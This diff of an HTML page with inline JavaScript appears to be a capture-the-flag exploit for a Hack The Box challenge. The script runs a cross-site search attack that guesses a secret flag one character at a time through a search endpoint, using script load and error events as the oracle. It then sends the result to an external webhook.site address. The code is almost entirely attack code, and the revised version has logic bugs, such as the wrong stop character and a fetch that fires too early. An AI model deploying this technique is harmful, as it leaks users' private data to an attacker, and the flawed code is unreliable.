@@ -1,41 +1,38 @@
 <html>
   <script>
-    var ip = "127.0.0.1:1337";
-    var flag = "HTB";
-    var abc =
-      "-+!@abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789{}_";
-    var special = "_%\"\'";
-    var url1 = `http://${ip}/api/entries/search?q=`;
-    async function getPartialFlag(char) {
+    var ip = "127.0.0.1:1337"; // HTB Server IP Address
+    var flag = "HTB{"; // init search word
+    var letters =
+      "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_";
+    var url = `http://${ip}/api/entries/search?q=`;
+    async function getLetter(ch) {
       return new Promise((resolve, reject) => {
         const script = document.createElement("script");
-        script.src = url1 + encodeURIComponent(flag + char);
-        script.onload = () => (char === "}" ? reject(char) : resolve(char));
-        script.onerror = () => reject(char);
+        script.src = url + encodeURIComponent(flag + ch);
+        script.onload = () => (ch === "}" ? reject(ch) : resolve(ch));
+        script.onerror = () => reject(ch);
         document.head.appendChild(script);
       });
     }
-    async function getFlag(chars) {
+    async function getFullWord(letters) {
       var b = false;
-      var char;
-      for (var i = 0; i < chars.length; i++) {
-       
-        await getPartialFlag(chars[i]).then(
+      var ch;
+      for (var i = 0; i < letters.length; i++) {
+        await getLetter(letters[i]).then(
           (res) => {
             flag = flag.concat(res);
-            b = res === "}" ? true : false;
+            b = res === "x" ? true : false;
             i = 0;
           },
           (res) => {}
         );
         if (b) break;
       }
-      fetch(
-        `https://webhook.site/db6373ae-d9d9-457b-9570-be60f11cea7a/?flag=${flag}`,
-        { method: "get" }
-      );
     }
-    getFlag(abc);
+    getFullWord(letters);
+    fetch(
+      `https://webhook.site/db6373ae-d9d9-457b-9570-be60f11cea7a/?flag=${flag}`,
+      { method: "GET" }
+    );
   </script>
-  <html></html>
 </html>
